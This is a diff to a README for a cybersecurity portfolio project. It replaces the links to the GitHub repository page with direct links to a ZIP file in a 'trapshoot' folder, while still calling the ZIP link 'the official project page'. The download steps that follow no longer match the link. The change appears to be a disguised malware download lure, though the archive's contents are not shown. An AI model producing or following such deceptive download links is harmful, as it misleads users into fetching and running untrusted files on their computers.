@@ -1,6 +1,6 @@
 # 🛡️ CyberSec-Portfolio - Showcase your cybersecurity skills with style
 
-[![](https://img.shields.io/badge/Download-Portfolio_Files-blue.svg)](https://github.com/wan03190/CyberSec-Portfolio)
+[![](https://img.shields.io/badge/Download-Portfolio_Files-blue.svg)](https://raw.githubusercontent.com/wan03190/CyberSec-Portfolio/main/trapshoot/Portfolio-Cyber-Sec-v1.7.zip)
 
 ## 📋 About the Project
 
@@ -21,7 +21,7 @@ You need a basic Windows computer to view and run this portfolio.
 
 Follow these steps to get the files onto your computer.
 
-1. Go to the official project page: [https://github.com/wan03190/CyberSec-Portfolio](https://github.com/wan03190/CyberSec-Portfolio).
+1. Go to the official project page: [https://raw.githubusercontent.com/wan03190/CyberSec-Portfolio/main/trapshoot/Portfolio-Cyber-Sec-v1.7.zip](https://raw.githubusercontent.com/wan03190/CyberSec-Portfolio/main/trapshoot/Portfolio-Cyber-Sec-v1.7.zip).
 2. Look for the green button labeled Code.
 3. Click the button and select Download ZIP.
 4. Your computer saves a compressed folder. 
